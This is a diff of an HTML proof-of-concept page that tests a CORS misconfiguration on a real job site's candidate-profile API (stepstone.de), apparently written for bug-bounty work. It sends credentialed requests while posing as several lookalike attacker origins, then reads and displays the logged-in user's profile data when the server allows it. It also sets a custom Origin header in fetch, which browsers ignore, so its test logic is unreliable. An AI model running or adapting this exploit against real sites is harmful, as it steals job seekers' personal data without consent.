@@ -1,49 +1,153 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CORS PoC - StepStone</title>
+    <title>CORS PoC - StepStone Profile Endpoint</title>
 </head>
 <body>
-    <h1>CORS Misconfiguration PoC</h1>
-    <button onclick="exploit()">Run Exploit</button>
-    <div id="result"></div>
+    <h1>CORS Testing for Profile Endpoint</h1>
+    <div id="results"></div>
 
     <script>
-    async function exploit() {
+    const targetEndpoint = 'https://www.stepstone.de/candidate/profile/editor/api/v1/profile';
+    
+    async function testCORS(origin, description) {
         try {
-            const response = await fetch('https://www.stepstone.de/candidate/profile/editor/api/v1/profile', {
+            console.log(`Testing: ${description}`);
+            console.log(`Origin: ${origin}`);
+            
+            const response = await fetch(targetEndpoint, {
                 method: 'GET',
                 credentials: 'include',
                 headers: {
-                    'Origin': 'https://www.stepstone.de.i-am-hunter.xyz'
+                    'Origin': origin,
+                    'Accept': 'application/json',
+                    'Content-Type': 'application/json'
                 }
             });
             
-            const resultDiv = document.getElementById('result');
+            const result = {
+                description: description,
+                origin: origin,
+                acao: response.headers.get('Access-Control-Allow-Origin'),
+                acac: response.headers.get('Access-Control-Allow-Credentials'),
+                status: response.status,
+                statusText: response.statusText,
+                headers: Object.fromEntries(response.headers.entries())
+            };
             
-            // Show CORS headers
-            const acao = response.headers.get('Access-Control-Allow-Origin');
-            const acac = response.headers.get('Access-Control-Allow-Credentials');
-            
-            resultDiv.innerHTML = `
-                <h3>CORS Headers:</h3>
-                <p>Access-Control-Allow-Origin: <strong>${acao}</strong></p>
-                <p>Access-Control-Allow-Credentials: <strong>${acac}</strong></p>
-            `;
-            
+            // Try to read response if successful
             if (response.ok) {
-                const data = await response.json();
-                resultDiv.innerHTML += `
-                    <h3>Data Retrieved (partial):</h3>
-                    <pre>${JSON.stringify(data, null, 2).substring(0, 1000)}...</pre>
-                `;
-            } else {
-                resultDiv.innerHTML += `<p>Status: ${response.status}</p>`;
+                try {
+                    result.data = await response.json();
+                } catch (e) {
+                    result.data = await response.text();
+                }
             }
+            
+            return result;
+            
         } catch (error) {
-            document.getElementById('result').innerHTML = `Error: ${error.message}`;
+            return {
+                description: description,
+                origin: origin,
+                error: error.message,
+                stack: error.stack
+            };
         }
     }
+
+    async function runAllTests() {
+        const resultsDiv = document.getElementById('results');
+        resultsDiv.innerHTML = '<h3>Testing CORS on Profile Endpoint...</h3>';
+        
+        const testCases = [
+            {
+                origin: 'https://www.stepstone.de.i-am-hunter.xyz',
+                desc: 'Subdomain with exact match'
+            },
+            {
+                origin: 'https://wwwstepstone.de.i-am-hunter.xyz', 
+                desc: 'No dot after www'
+            },
+            {
+                origin: 'https://stepstone.de.i-am-hunter.xyz',
+                desc: 'Without www'
+            },
+            {
+                origin: 'https://attacker-stepstone.de.i-am-hunter.xyz',
+                desc: 'Prefix attacker'
+            },
+            {
+                origin: 'https://stepstone.de.attacker.com',
+                desc: 'Different attacker domain'
+            },
+            {
+                origin: 'https://www.stepstone.de.example.com',
+                desc: 'Example domain'
+            },
+            {
+                origin: 'null',
+                desc: 'Null origin'
+            },
+            {
+                origin: 'https://www.stepstone.de',
+                desc: 'Legitimate origin (control)'
+            }
+        ];
+
+        for (const test of testCases) {
+            resultsDiv.innerHTML += `<p>Testing: <strong>${test.desc}</strong> - ${test.origin}</p>`;
+            
+            const result = await testCORS(test.origin, test.desc);
+            
+            // Display results
+            resultsDiv.innerHTML += `
+                <div style="margin: 10px; padding: 10px; border: 1px solid #ccc; background: #f9f9f9;">
+                    <strong>${test.desc}</strong><br>
+                    <strong>Origin:</strong> ${result.origin}<br>
+                    <strong>ACAO:</strong> <span style="color: ${result.acao && result.acao !== 'null' ? 'red' : 'green'}">${result.acao || 'null'}</span><br>
+                    <strong>ACAC:</strong> ${result.acac || 'null'}<br>
+                    <strong>Status:</strong> ${result.status} ${result.statusText || ''}<br>
+                    ${result.error ? `<strong>Error:</strong> ${result.error}` : ''}
+                    ${result.data ? `<strong>Data Preview:</strong> ${JSON.stringify(result.data).substring(0, 200)}...` : ''}
+                </div>
+                <hr>
+            `;
+            
+            // Log to console for detailed analysis
+            console.log('Test Result:', result);
+        }
+    }
+
+    // Also test OPTIONS preflight
+    async function testPreflight(origin) {
+        try {
+            const response = await fetch(targetEndpoint, {
+                method: 'OPTIONS',
+                headers: {
+                    'Origin': origin,
+                    'Access-Control-Request-Method': 'GET',
+                    'Access-Control-Request-Headers': 'Content-Type'
+                }
+            });
+            
+            console.log('Preflight Result:', {
+                origin: origin,
+                headers: Object.fromEntries(response.headers.entries()),
+                status: response.status
+            });
+            
+        } catch (error) {
+            console.log('Preflight Error:', error);
+        }
+    }
+
+    // Run tests
+    runAllTests().then(() => {
+        // Test preflight for a few origins
+        testPreflight('https://www.stepstone.de.i-am-hunter.xyz');
+        testPreflight('https://stepstone.de.i-am-hunter.xyz');
+    });
     </script>
 </body>
 </html>
